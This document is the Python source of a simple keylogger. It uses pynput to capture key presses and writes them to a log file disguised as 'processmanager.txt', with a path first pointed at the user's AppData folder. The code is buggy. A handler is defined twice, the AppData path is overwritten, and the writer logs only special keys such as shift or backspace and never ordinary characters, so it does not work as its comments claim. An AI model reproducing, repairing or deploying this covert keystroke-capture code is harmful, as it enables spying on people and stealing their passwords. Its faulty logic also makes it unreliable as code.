# call in our modules
import os
from pynput.keyboard import Listener


# setting the data and the files
keys = []
count = 0
path = os.environ['appdata'] +'\\processmanager.txt'
path = 'processmanager.txt'


# define the keys
def on_press(key):
    global keys
    keys.append(key)
#counts keys 1 by 1
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1


#checks if count changes itll save file
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

#all of the k.find basically means, defining whenever a button is hit itll save whatever the speech is into the text file
def write_file(keys):
    with open(path, 'a') as f:
        for key in keys:
            k = str(key) .replace("'","")
            if k.find('backspace') > 0:
                f.write ('_backspace_')
            elif k.find('enter') > 0:
                f.write ('\n')
            elif k.find('space') > 0:
                f.write ('   ')
            elif k.find('tab') > 0:
                f.write (' tab ')
            elif k.find('shift') > 0:
                f.write ('_Sh!ft_')
            elif k.find('ctrl') > 0:
                f.write ('_ctrl_')
            elif k.find('capslock') > 0:
                f.write ('@Caps_locK_')
            elif k.find('alt') > 0:
                f.write ('_alt_')


#this will actively listen when enabled
with Listener(on_press=on_press) as listener:
    listener.join()